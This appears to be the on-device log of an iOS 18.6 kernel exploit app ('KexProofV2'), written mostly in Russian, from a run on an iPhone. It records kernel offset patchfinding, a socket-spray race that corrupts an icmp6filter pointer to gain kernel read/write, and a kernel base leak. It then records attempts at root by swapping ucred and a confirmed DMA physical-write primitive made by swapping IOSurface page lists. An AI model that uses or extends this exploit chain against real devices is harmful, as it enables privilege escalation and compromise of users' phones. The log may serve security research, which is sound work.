@@ -1,0 +1,2667 @@
+=== KexProofV2 consolidated share @ 2026-10-06 05:36:16 +0000 ===
+[экранный транскрипт текущей сессии: 30194 байт]
+
+----- TRANSCRIPT (in-memory, screen) -----
+=== запуск KexProofV2 2.0.16 @ 2026-10-06 05:34:45 +0000 ===
+KexProofV2 загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов.
+[auto] запускаю эксплойт сам (автостарт)
+=== KexProofV2 2.0.16 — iPhone16,1, Darwin 24.6.0 ===
+iOS 18.6
+
+[Этап 1/4] Патчфайндинг (XPF)
+kernelcache: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/kernelcache
+sptm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/sptm.img4
+txm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/txm.img4
+XPF: kernel загружен, base=0xfffffff007004000 darwin=24.6.0 sptm=–¥–∞ txm=–¥–∞
+[xpf] resolve kernelConstant.kernel_el...
+[xpf] resolve kernelSymbol.start_first_cpu...
+[xpf] resolve kernelSymbol.allproc...
+[xpf] resolve kernelSymbol.kalloc_data_external...
+[xpf] resolve kernelSymbol.fatal_error_fmt...
+[xpf] resolve kernelSymbol.kfree_data_external...
+[xpf] resolve kernelSymbol.SPTMArgs...
+[xpf] resolve kernelSymbol.cpu_ttep...
+[xpf] resolve kernelSymbol.arm_vm_init...
+[xpf] resolve kernelSymbol.gVirtBase...
+[xpf] resolve kernelSymbol.gPhysBase...
+[xpf] resolve kernelSymbol.gPhysSize...
+[xpf] resolve kernelConstant.pointer_mask...
+[xpf] resolve kernelSymbol.pointer_mask...
+[xpf] resolve kernelSymbol.pmap_bootstrap...
+[xpf] resolve kernelConstant.T1SZ_BOOT...
+[xpf] resolve kernelConstant.ARM_TT_L1_INDEX_MASK...
+[xpf] resolve kernelSymbol.txm_trustcache_root...
+[xpf] resolve kernelSymbol.txm_deviceTreeTrustCacheRange...
+[xpf] resolve kernelSymbol.vm_page_array_beginning_addr...
+[xpf] resolve kernelSymbol.vm_page_array_ending_addr...
+[xpf] resolve kernelSymbol.vm_first_phys_ppnum...
+[xpf] resolve kernelSymbol.vm_first_phys...
+[xpf] resolve kernelSymbol.sptm_get_page_table_refcnt...
+[xpf] resolve kernelSymbol.vm_last_phys...
+[xpf] resolve kernelSymbol.pp_attr_table...
+[xpf] resolve kernelSymbol.pmap_enter_pv...
+[xpf] resolve kernelSymbol.pv_head_table...
+[xpf] resolve kernelSymbol.pv_alloc...
+[xpf] resolve kernelSymbol.libsptm_papt_ranges...
+[xpf] resolve kernelSymbol.libsptm_init...
+[xpf] resolve kernelSymbol.wfe_timeout_configure...
+[xpf] resolve kernelSymbol.libsptm_n_papt_ranges...
+[xpf] resolve kernelSymbol.papt_ranges_compressed...
+[xpf] resolve kernelSymbol.papt_ranges_update...
+[xpf] resolve kernelSymbol.n_papt_ranges_compressed...
+[xpf] resolve kernelSymbol.libsptm_frame_table...
+[xpf] resolve kernelSymbol.libsptm_frame_type_params...
+[xpf] resolve kernelStruct.sptm_frame_type_descriptor.struct_size...
+[xpf] resolve kernelStruct.proc.struct_size...
+[xpf] resolve kernelStruct.task.itk_space...
+[xpf] resolve kernelSymbol.task_collect_crash_info...
+[xpf] resolve kernelSymbol.task_crashinfo_release_ref...
+[xpf] resolve kernelStruct.vm_map.pmap...
+[xpf] resolve kernelStruct.IOSurface.ranges...
+[xpf] resolve kernelStruct.IOSurface.IOMemoryDescriptor_withAddressRanges_ref...
+[xpf] resolve kernelStruct.IOSurface.rangeCount...
+[xpf] resolve kernelConstant.nsysent...
+[xpf] resolve kernelSymbol.proc_get_syscall_filter_mask_size...
+[xpf] resolve kernelConstant.mach_trap_count...
+[xpf] resolve kernelSymbol.mach_kobj_count...
+Словарь оффсетов XPF:
+  0x0000000000000060 <- kernelStruct.sptm_frame_type_descriptor.struct_size
+  0xfffffff0270d8bf0 <- kernelSymbol.n_papt_ranges_compressed
+  0xfffffff007b37750 <- kernelSymbol.libsptm_n_papt_ranges
+  0xfffffff007aa2968 <- kernelSymbol.pv_head_table
+  0x0000000000000011 <- kernelConstant.T1SZ_BOOT
+  0xfffffff007b37768 <- kernelSymbol.vm_last_phys
+  0xfffffff007aa29a8 <- kernelSymbol.vm_first_phys_ppnum
+  0xfffffff007aa29b0 <- kernelSymbol.vm_page_array_ending_addr
+  0xfffffff007aa29b8 <- kernelSymbol.vm_page_array_beginning_addr
+  0xfffffff007af4b48 <- kernelSymbol.gPhysBase
+  0xfffffff007aa32b0 <- kernelSymbol.cpu_ttep
+  0xfffffff00802b7f8 <- kernelSymbol.kalloc_data_external
+  0xfffffff007ad9f40 <- kernelSymbol.mach_kobj_count
+  0x00000000000003a4 <- kernelStruct.IOSurface.rangeCount
+  0x0000000000000040 <- kernelStruct.vm_map.pmap
+  0xfffffff007af4b50 <- kernelSymbol.gPhysSize
+  0x0000000000000001 <- kernelConstant.kernel_el
+  0xfffffff027004000 <- kernelConstant.staticSptmBase
+  0xfffffff007004000 <- kernelConstant.staticBase
+  0x000000000000022e <- kernelConstant.nsysent
+  0x0000000000000740 <- kernelStruct.proc.struct_size
+  0xfffffff007b37760 <- kernelSymbol.vm_first_phys
+  0xfffffff017004000 <- kernelConstant.staticTxmBase
+  0x0000000000000080 <- kernelConstant.mach_trap_count
+  0xfffffff007b37790 <- kernelSymbol.libsptm_frame_type_params
+  0xfffffff0270d8c00 <- kernelSymbol.papt_ranges_compressed
+  0xfffffff007b37758 <- kernelSymbol.libsptm_papt_ranges
+  0xfffffff007aa2960 <- kernelSymbol.pp_attr_table
+  0x0000000000000360 <- kernelStruct.IOSurface.ranges
+  0x0000000000000318 <- kernelStruct.task.itk_space
+  0x00007ff000000000 <- kernelConstant.ARM_TT_L1_INDEX_MASK
+  0xfffffff00aaa2608 <- kernelSymbol.allproc
+  0xfffffff007b37788 <- kernelSymbol.libsptm_frame_table
+  0xfffffff017010590 <- kernelSymbol.txm_trustcache_root
+  0xffff800000000000 <- kernelConstant.pointer_mask
+  0xfffffff007ac4c70 <- kernelSymbol.gVirtBase
+  0xfffffff007b36a48 <- kernelSymbol.SPTMArgs
+  0xfffffff00802be88 <- kernelSymbol.kfree_data_external
+gSystemInfo заполнена (динамические + жёстко заданные оффсеты)
+
+[Этап 2/4] Эксплойт ClearSword (может занять несколько минут)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+machine: iPhone16,1
+hw.cpufamily: 0x2876f5b5
+[KP] engine start: iOS 18.6, iPhone16,1, cpufamily 0x2876f5b5 — offsets: icmp6filt=0x148 chksum=0x150 pcbinfo=0x38 ipi_zone=0x68 zone_elem_size=0x34 itk_space=0x318
+[+] Running on non-A18 device
+[i] low-RAM device (7682MB) — search space scaled to 0xf016 pages (floor 0x8000)
+[i] totalSearchMappingPagesNum: 0xf016
+[i] searchMappingSize: 0x8000000
+[i] totalSearchMappingSize: 0x3c058000
+[i] searchMappingNum: 0x7
+[+] physicalMappingAddress: 0x1012fc000
+[+] pcAddress: 0xf14bd0000
+[+] pe_v1 spray/race cycle 1/6
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[i] socketPortsCount: 22528
+[i] startPcbId: 4 endPcbId: 45058
+[i] looking in search mapping: 0
+[+] pcbStartOffset: 0x400 (filt=0x148 gencnt=0x78)
+[+] targetInpGencnt: 0x1626
+[+] inpListNextPointer: 0xffffffe10a74ffe0
+[+] icmp6Filter: 0xffffffe2dac13480
+[STAGED] stage 1/2 pass — readonly layout validated on-device (filt=0x148 gencnt=0x78), kernel writes measured so far: 0 (BUG.5); corrupting single socket
+[+] alias write (icmp6filt): 0xffffffe10a750128 verified (writeKr=0, attempts=1)
+[+] re-alias (neighbor): 0xffffffe10a750948 verified (writeKr=0, attempts=1)
+[STAGED] re-alias на newer якорь 0xffffffe10a750948: verified
+[+] probe: rw в окне @+0x800 (gencnt=0x1628 → порт #2834, newer якорь) — бинд по окну
+[probe] selftest: getsockopt(control fd=10) через алиас → res=0 len=32 qword0=0xffffffe2dac134a0 (в окне icmp6Filter был 0xffffffe2dac13480)
+[+] probe fds: пара открыта — control idx=2833 fd=10, rw idx=2834 fd=11
+[STAGED] zone window: pcb 0xffffffe10a750400 zone bucket not a kalloc class (raw 0) (qword 0) vs field span 0x160 -> declaring 0x160 bytes (field span (bucket unknown))
+[STAGED] probe (control inp6_chksum at pcb+0x150 = 0xffffffe10a750550): read 0, wrote 0x4141414141414141, read back 0x4141414141414141, restored 0 — krw write+read verified (control-side, clamped)
+[STAGED] probe promoted: icmp6filt corruption KEPT (idx=2833), proven by an inp6_chksum round trip — this socket IS the krw primitive; restore is owned by the caller (run_write_test / staged stage-2 failure path)
+[cleanup] pe_v1: memory object 0x590703 released (kr=0)
+[cleanup] sockets_release: 24576 sprayed socket fileports released
+[cleanup] pe_v1: search mapping 0xda81cc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x6bef90000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x668428000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x4266a0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xc9b0c8000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x5c0cb0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xb4aacc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: searchMappings tracker released (0 left, BUG.2)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[+] pe_v1 socket corruption succeeded
+[cleanup] pe_v1: gencnt tracker released (1 entries, BUG.2)
+[+] highestSuccessIdx: 497
+[+] successReadCount: 514
+[SCAN] kernel writes issued this attempt: 2 write(s), 64 byte(s) [measured by kwrite_counter, BUG.5]
+[SCAN]   by route: early_kwrite32bytes=0  early_kwrite64=0  krw_zone_write_block=2  (refused: 0)
+[cleanup] kexploit: free thread stopped + joined (BUG.2)
+[cleanup] kexploit: target fds closed (readFd=8 writeFd=9, BUG.2)
+[+] kernel base scan start: 0xfffffff04bd08000 (zv_name=0xfffffff04bd09d38)
+    scan iter 0 base=0xfffffff04bd04000 val=0x6e6f207369207325
+[STAGED] stage 2/2 pass — krw read chain + kernel magic verified (base=0xfffffff04bc98000 slide=0x44c94000); full chain proceeding
+early_kread64(0xfffffff04bc98000) -> 0x100000cfeedfacf
+win??
+[engine] returning 0 — промоушн и база ядра подтверждены; повторный pe_v1 в этом процессе запрещён
+[+] readFd: 8
+[+] writeFd: 9
+[+] pcObject: 40743
+[+] Corrupting icmp6filter pointer...
+[+] Found control_socket at idx: 2833
+Эксплойт УСПЕШЕН. kernel slide = 0x44c94000, kernel base = 0xfffffff04bc98000
+kreadbuf=0xbd7f80010037806c kwritebuf=0xbb35000100378088 minSafeRead=0x20
+
+[Этап 3/4] Константы загрузки и трансляция адресов
+  gVirtBase: raw=0xfffffff026af0000 strip=0xfffffff026af0000
+  gPhysBase: raw=0x0000010002af0000 strip=0x0000010002af0000
+  gPhysSize: raw=0x00000001e02d8000 strip=0x00000001e02d8000
+  cpu_ttep: raw=0x0000010007ce4000 ttbr-phys=0x0000010007ce4000 va-формой=0x0000010007ce4000
+  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote
+  EXP-02 (формула, без голосования): sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000
+  EXP-02 (формула): txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+  base=0xfffffff04bc98000 virtBase=0xfffffff026af0000 physBase=0x10002af0000 physSize=0x1e02d8000 cpuTTEP=0x10007ce4000 sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000 txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+
+[E9 auto] root через ucred swap — сразу после победы, без нажатий
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+
+=== EXP-09: root через подмену указателя p_ucred (heap-only) ===
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.
+Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).
+[E9 auto] uid сейчас: 501 (–Ω–µ root)
+Этапы 1-3 готовы, KRW жив. Дамп — отдельной кнопкой (дамп пишется инкрементально, паника не сотрёт готовые секции).
+=== IOSurface backing-PA swap: physwrite через DMA ===
+  [DCPAV] DCPAVControllerProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVDeviceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVServiceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVVideoInterfaceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVAudioInterfaceProxy: сервис НЕ найден
+  surfaces: srcID=15 dstID=12 (подменяем backing у dst)
+  процесс "KexProofV2" (p_name="KexProofV2") @ 0xffffffe2d77dd660 (узлов=0)
+  контрольная страница: VA=0x1017dc000 PA=0x10142234000 (заполнена 0xCC)
+  [CAL] physmap-алиасы (рано, маркер жив): linear=0xaa0103f9 papt=0xcafebabe → PAPT ✓
+  ctlPA валидация: phystokv(0x10142234000)=0xcafebabe → ВЕРНО
+  backing PA dst = 0x10030520000 (vtophys пикселей VA=0x10450c000), маркер по phystokv: 0x41544159 → ПОДТВЕРЖДЁН
+  SCAN A (после create, до churn/submit):
+  frame table: raw=0xfffffff05078c000 → VA 0xfffffff05078c000
+    [A] hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148
+    [A] hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000
+    [A] hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000
+  [A] попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  isTable=0xffffffed0cd8c000 (звенья: proc_ro=0xffffffdf41f82460 task=0xffffffe2d77ddda0 itk=0xd1e6ffe027ed2728)
+  ip_kobject oracle: task port VA=0xffffffe10b4aec50 selfTask=0xffffffe2d77ddda0 → ip_kobject @ +0x48 (статика +0x48)
+  порт-маршрут: smp=0x347e77 kobj=0xffffffe028843120 vt=0xfffffff04c797d68 (file 0xfffffff007b03d68; SendRight ждём 0xfffffff04cb834c8)
+    kobj+0x00: raw=0x128b7ff04c797d68 untag=0xfffffff04c797d68 → [+0x10]=0x4d297234 surfFast=0
+    kobj+0x08: raw=0x0000000100000001 untag=0x0000000100000001
+    kobj+0x10: raw=0x0000010122000000 untag=0x0000010122000000
+    kobj+0x18: raw=000000000000000000 untag=000000000000000000
+    kobj+0x20: raw=0xffffffe028840c60 untag=0xffffffe028840c60 → [+0x10]=0x22000000 surfFast=0
+    kobj+0x28: raw=0xffffffe10864e860 untag=0xffffffe10864e860 → [+0x10]=0 surfFast=0
+    kobj+0x30: raw=0x52c47fe2d9864fa0 untag=0xffffffe2d9864fa0 → [+0x10]=0xf41ec400 surfFast=0
+    IOMachPort: fPort=0xffffffe10864e860 kotype=0x1b fObject=0xffffffe2d9864fa0 vt=0xfffffff04cb834c8 (file 0xfffffff007eef4c8 = SendRight!)
+    SendRight ✓: owner(Root)=0xffffffe1f41ec400 IOSurface=0xffffffe10e25ad40 ([surf+0x10]=0xc ждём 12) surfFast=0
+  ★ smp IOMachPort-хоп → IOSurface 0xffffffe10e25ad40
+  ★ порт-маршрут дал surfVA=0xffffffe10e25ad40 — слоты/подмена ДО submit
+  IOSurface 0xffffffe10e25ad40: rangeObj(+0x178)=0xffffffedf8c908a0 plane(+0x30)=0xffffffdf4485e3e8 ranges(+0x360)=0 rangeCount(+0x3a4)=0
+  planeDesc vtable: 0xfffffff04c7c7db8 (file 0xfffffff007b33db8) — класс IOMD
+    IOMD lvl0: md=0xffffffdf4485e3e8 [+0x60]=0xffffffe10e3e9fe0 count=1 [0]=000000000000000000 [8]=0x0000000000080000
+    pd+0000: 0x44a67ff04c7c7db8
+    pd+0x08: 0x0000000000010002
+    pd+0x10: 0xffffffe0264f9300
+    pd+0x18: 0xffffffe1f3b0b580
+    pd+0x20: 0x0000000000510513
+    pd+0x28: 0xffffffe028713880
+    pd+0x30: 0x000000000058004e
+    pd+0x38: 000000000000000000
+    pd+0x40: 000000000000000000
+    pd+0x48: 000000000000000000
+    pd+0x50: 0x0000000000080000
+    pd+0x58: 000000000000000000
+    pd+0x60: 0xffffffe10e3e9fe0
+    pd+0x68: 0x0000000000000001
+    pd+0x70: 0xffffffe2d9a801e0
+    pd+0x78: 000000000000000000
+    pd+0x80: 000000000000000000
+    pd+0x88: 0x0000000100000000
+    pd+0x90: 0xffffffe10d754250
+    pd+0x98: 0x0406e1fe00000020
+    pd+0xa0: 000000000000000000
+    pd+0xa8: 0xffffffe2da0d4b70
+    pd+0xb0: 000000000000000000
+    pd+0xb8: 000000000000000000
+    pd+0xc0: 0x0000000000080000
+    pd+0xc8: 0x0000000000004000
+    pd+0xd0: 0x0000000000110063
+    pd+0xd8: 000000000000000000
+    pd+0xe0: 0x0000000000000008
+    pd+0xe8: 0xdea87ff04c7c7db8
+    pd+0xf0: 0x0000000000010004
+    pd+0xf8: 0xffffffe0264faf20
+  IOSurface найден, но pfn-слотов нет — уходим в старые пути
+  [frame-type census] type=0x11 (pa=0x101aa45c000)
+  [frame-type census] type=0x13 (pa=0x1017f9c8410)
+  [CHAIN-S] srcVA=0xffffffe10e25b100 pd=0xffffffdf4484f520 type=0x10 buf=0xffffffe02813cc80 count=0x20 entry0=0x000000040400ae68 — маркеры сошлись (physread вооружён)
+  [CHAIN] pd=0xffffffdf4485e3e8 vt=0xfffffff04c7c7db8 type=0x10 hdr=0xffffffe10d754250 buf=0xffffffe02813c800 count=0x20 flags=0xc0 — маркеры сошлись, патчим entries
+  [CHAIN] ★ entry[0] @ 0xffffffe02813c830: 0x000000040400c148 → ctlPFN 0x405088d (зона: не зона/VM)
+      readback: 0x000000040405088d — ПРИЛИПЛО
+  [PH] VAD (VA-field deputy) — старт
+  [frame-type census] type=0x8 (pa=0x10007ce7fe8)
+  [frame-type census] type=0x9 (pa=0x1000974fd10)
+  [frame-type census] type=0x21 (pa=0x1018b9323e8)
+  [frame-type census] type=0xb (pa=0x1000d2e08a0)
+  [frame-type census] type=0xc (pa=0x10007797db8)
+  [VAD] VA-поле не найдено (пулов=15, полей проверено=66, physmap-скип=60) — следующий шаг: pv_head/второй уровень
+  [PH] PAR (parent-ranges) — старт
+  [PAR] parentMD=0xffffffe10e3e9fe0 arr=0x66eadc000 count=32768
+  [VDB] [planeDesc+0xb8] = 000000000000000000 (ноль — ranges-based)
+  [VDB] vmctx [0x7b33f28]=0xffffffde0c3ba890 (sym 0xfffffff04c7c7f28)
+    vmctx+0: 0x0000000033000000
+    vmctx+0x8: 0x0000000000420000
+    vmctx+0x10: 0xffffffde0c3beed0
+    vmctx+0x18: 0xffffffde0c3bfdd0
+    vmctx+0x20: 0xffffffdc00000000
+    vmctx+0x28: 0xfffffffbffffffff
+    vmctx+0x30: 0x0000000e00000883
+    vmctx+0x38: 0xffffffde0c452d60
+    vmctx+0x40: 0x6ed17ff04f714170
+    vmctx+0x48: 0x00000014c5988000
+    vmctx+0x50: 0x7fffffffffffffff
+    vmctx+0x58: 0x7fffffffffffffff
+    vmctx+0x60: 0x0000000fc0000000
+    vmctx+0x70: 0x00000000000007c7
+    vmctx+0xc0: 0xffffffde0caf04a0
+    vmctx+0xc8: 0xffffffdef292dac0
+    vmctx+0xd0: 0xffffffde0c3c14e0
+    vmctx+0xd8: 0x000f47b900000080
+    vmctx+0xe8: 0x0000000000000001
+    vmctx+0xf0: 0x0000000033000000
+    vmctx+0xf8: 0x0000000000420000
+    vmctx+0x100: 0xffffffde0c5d90d0
+    vmctx+0x108: 0xffffffde0c462890
+    vmctx+0x110: 0xffffffedf8c88000
+    vmctx+0x118: 0xffffffee58c88000
+    vmctx+0x120: 0x0001000e00000508
+    vmctx+0x128: 0xffffffde0c86c560
+    vmctx+0x130: 0x0bb8fff04f714170
+    vmctx+0x138: 0x0000000006648000
+    vmctx+0x140: 0x7fffffffffffffff
+    vmctx+0x148: 0x7fffffffffffffff
+    vmctx+0x150: 0x0000000fc0000000
+    vmctx+0x160: 0x0000000000000002
+    vmctx+0x1b0: 0xffffffde0c99d8f0
+    vmctx+0x1b8: 0xffffffdef292aa00
+    vmctx+0x1c0: 0xffffffdef2407260
+    vmctx+0x1c8: 0x0000194000000080
+    vmctx+0x1d8: 0x0000000000000011
+    vmctx+0x1e0: 0x0000000033000000
+    vmctx+0x1e8: 0x0000000000420000
+    vmctx+0x1f0: 0xffffffde0c3baa80
+    vmctx+0x1f8: 0xffffffde0c3baa80
+  [VDB2] маркер-hits по surf-pointees: 0
+    surf+0x8: 0x0000000200000001 (arena?)
+    surf+0x70: 0x0000000001010004
+    surf+0x80: 0x0000000042475241 (arena?)
+    surf+0x3b8: 0x000001eb0005892d (PA?)
+    surf+0x3c8: 0x0000000200000001 (arena?)
+    pd+0x20: 0x0000000000510513
+    pd+0x30: 0x000000000058004e
+    pd+0x88: 0x0000000100000000 (arena?)
+    pd+0xd0: 0x0000000000110063
+  [PH] OWN (owner-MD база) — старт
+  [OWN] A: [pd+0x28]=0xffffffe028713880 [P]=0x1 (signed — не пишем)
+  [OWN] B: [pd+0x90]=0xffffffe10d754250 recs=0xffffffe02813c800 ownerMD=0
+  [PH] RMD (root-MD page-list) — старт
+  [RMD] pd=0xffffffdf4485e3e8 rootMD=0xffffffe10e3e9fe0
+  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора
+  victim#1 async submit (real src): kr=0x0 — mapping кэшируется на pipe
+  [SPC] pd=0xffffffdf4485e3e8 spec([pd+0x60])=0xffffffe10e3e9fe0
+  [SPC] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec+0: 000000000000000000
+    spec+0x8: 0x0000000000080000
+    spec+0x10: 0x0000000483f88000
+    spec+0x18: 0x0000000000100000
+    spec+0x20: 0xffffffedfcc54000
+    spec+0x28: 0x0000000000004000
+    spec+0x30: 0x000000066e8dc000
+    spec+0x38: 0x0000000000100000
+    spec+0x40: 0xffffffedfede4000
+    spec+0x48: 0x0000000000004000
+    spec+0x50: 0x000000066e9dc000
+    spec+0x58: 0x0000000000100000
+  [SPC] fallback: UC=0xffffffdf440cdcd0 pipe=0xffffffe1f38b2400 node=0xffffffe0269c9648
+  [frame-type census] type=0x15 (pa=0x1000b8dbf40)
+  [SPC] spec+0x58 с pfn32 нигде не найден
+  [frame-type census] type=0x6 (pa=0x100057352bc)
+  [OPC-E] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):
+    hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148 | соседи: 0x0000c04000000020 0x000000040400c147
+    hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000 | соседи: 0x000001000efd0000 0x0000000000004000
+    hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000 | соседи: 0x00000100007bc000 0x0000000000004000
+  измерение: попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор
+  жду execute victim-опа (backlog ~800 async)…
+  dst пиксели после execute: ненулевых = 1024 — DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)
+  [OPC] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  [DSX] planeDesc=0xffffffdf4485e3e8 type(0x20&0xf0)=0x10
+    dsx entry+0: addr=000000000000000000 len=0x80000 → PA 0
+    dsx entry+0x10: addr=000000000000000000 len=0x20000 → PA 0
+    dsx entry+0x20: addr=0xffffffedfcc54000 len=0x4000 → PA 0x10050500000
+    dsx entry+0x30: addr=0x000000066e8dc000 len=0x100000 → PA 0
+    dsx entry+0x40: addr=0xffffffedfede4000 len=0x4000 → PA 0x100e29e0000
+    dsx entry+0x50: addr=0x000000066e9dc000 len=0x100000 → PA 0
+    dsx entry+0x60: addr=0x000000066eadc000 len=0x100000 → PA 0
+  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)
+  [DSY] rangeObj=0xffffffedf8c908a0 vt(file)=0 (ждём 0x7b33db8)
+  [SPC-post] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec-post+0: 000000000000000000
+    spec-post+0x8: 0x0000000000080000
+    spec-post+0x10: 000000000000000000
+    spec-post+0x18: 0x0000000000020000
+    spec-post+0x20: 0xffffffedfcc54000
+    spec-post+0x28: 0x0000000000004000
+    spec-post+0x30: 0x000000066e8dc000
+    spec-post+0x38: 0x0000000000100000
+    spec-post+0x40: 0xffffffedfede4000
+    spec-post+0x48: 0x0000000000004000
+    spec-post+0x50: 0x000000066e9dc000
+    spec-post+0x58: 0x0000000000100000
+  [RETRY #1] submit kr=0x0 ctl-changed=1024 слот#0=000000000000000000
+      buffer пост-submit: flags=0xc0 entry0=0x000000040405088d entry1=0x000000040400c147 — ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)
+=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (1024 dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===
+  [FORGE] proc_ro=0xffffffdf41f82460 ucred=0xffffffdf41fc87c0 (getuid=501 getgid=501)
+  [FORGE] PAPT сток: tbl=0xfffffff02bd6cc00 n=15
+    stock[0]: 0x00000100082e8000 0xfffffff050000000 0x0000000000076ab8
+  [FORGE] PAPT охота: 11 pointee-кандидатов
+  [FORGE] PAPT найдена @ 0xfffffff02bd6cc00 (fmt=24-B n=15)
+  [FORGE] walker встал на L3 tte=0x1000b8dbf90 — physread через DART
+  [FORGE] leaf PTE = 0x5a5a5a5a5a5a5a5a
+  [PSWAP] p_ucred field: VA=0xffffffdf41f82488 PA=0 (walk deadly — мимо)
+  [PHYSWRITE8v2] target=0x101c86c4000+0 payload=0x0460010142234603 kr=0x0
+  [TBL-TEST] L3[0] нашего proc: readback=000000000000000000 (ждём 0x0460010142234603) → ДРОП (CTRR фенсит и их)
+  [SCAN-Z2] старт: uoff=0x7c0 label=0xc09dffdf41ddacc0 uid=501 roOff=0x2488 ucF=0xffffffdf41fc87c0 frames=0x780b6
+  [SCAN-Z2] скип PA-спаны: SPTM 0x10022af0000..0x10022be4000 TXM 0x10012af0000..0x10012b54000
+  [SCAN-Z2] калибровка из кэша [CAL]: PAPT ✓
+  [SCAN-Z2] whitelist контент-чтений: типы {0x10, 11, 11}, старт idx=0x10000 (PA>=0x10042af0000)
+  [SCAN-Z2] прогресс 0x10000/0x780b6 (чтений 0)
+  [frame-type census] type=0xe (pa=0x10042b10000)
+  [frame-type census] type=0x36 (pa=0x100430f0000)
+  [frame-type census] type=0x35 (pa=0x10043660000)
+  [frame-type census] type=0x18 (pa=0x100437dc000)
+  [frame-type census] type=0x37 (pa=0x10043ecc000)
+  [frame-type census] type=0x34 (pa=0x1004594c000)
+  [frame-type census] type=0x30 (pa=0x10047fc0000)
+  [frame-type census] type=0x17 (pa=0x1005ffe0000)
+  [SCAN-Z2] прогресс 0x18000/0x780b6 (чтений 32768)
+  [frame-type census] type=0x33 (pa=0x10062f1c000)
+  [frame-type census] type=0x31 (pa=0x100630bc000)
+  [frame-type census] type=0x14 (pa=0x10066554000)
+  [frame-type census] type=0x12 (pa=0x1006656c000)
